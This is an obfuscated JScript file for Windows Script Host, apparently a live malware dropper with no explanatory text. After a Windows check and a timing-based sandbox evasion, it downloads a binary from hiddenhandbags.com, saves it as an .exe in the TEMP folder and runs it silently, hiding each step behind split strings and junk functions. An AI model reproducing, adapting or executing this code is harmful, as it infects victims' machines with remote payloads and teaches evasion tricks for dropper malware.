var gy = false;
var Va = "CreateObject";
var E0 = function E() {return WScript[Va]("WScript.Shell");}(), bS = 11;
var gz = "MSXML2.XMLHTTP";
var zi = 2123213;
var Kl = 0;
function U(ty){E0["Run"](ty, Kl, Kl);};
function r(){return "" + gz;};
function kP(rc, LZ){Kl = Kl * 1; return rc - LZ;};
function T(){return Va;};
/*@cc_on
  @if (@_win32 || @_win64)
    gy = true;
  @end
@*/
if (gy)
{
var ec = "";
function H(){return 22;};
var ku = 0; var G = 0;
function NQ()
{
var wo = new this["Date"]();
var CE = wo["getUTCMilliseconds"]();
WScript["Sleep"](H());
var wo = new this["Date"]();
var Um = wo["getUTCMilliseconds"]();
WScript["Sleep"](H());
var wo = new this["Date"]();
var fs = wo["getUTCMilliseconds"]();
var ku = "tH";
ku = kP(Um, CE);
var G = "HX";
G = kP(fs, Um);
ec = "open";
return kP(ku, G);
}
var bG = false;
var c = false;
for (var mV = Kl; mV < H() * 1; mV++){if (NQ() != Kl){
bG = true; 
G = "31" + 11 * ku + G; 
c = true; 
break;
}}
function YA() {return ((bG == true) && (bG == c)) ? 1 : Kl;};
if (bG && YA() && c){
function Tb() {return E0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "bIz5rWrQgmSU.exe";};
 WN = r();
 j = WScript[Va](WN);
 var Z = 1;
 while (Z){
try {
j[ec]("GET", "http://hiddenhandbags.com/kdk4a", false);
j["send"]();
P = "Sleep";
for (;;){WScript[P](H() * 11); if (j["readystate"] >= 2 * 2) break;};
Z = Kl;
} catch(YC){};
}
function w(te) {var oD = (1, 2, 3, 4, 5, te); return oD;};
V = WScript[T()]("ADODB.Stream");
WN = V;
WN[ec]();
WN["type"] = w(1);
WN["write"](j["ResponseBody"]);
V["position"] = w(Kl);
WN["Save" + "ToFile"](Tb(), 2);
V["c"+"lose"]();
r0 = Tb();
U(r0);
}
}

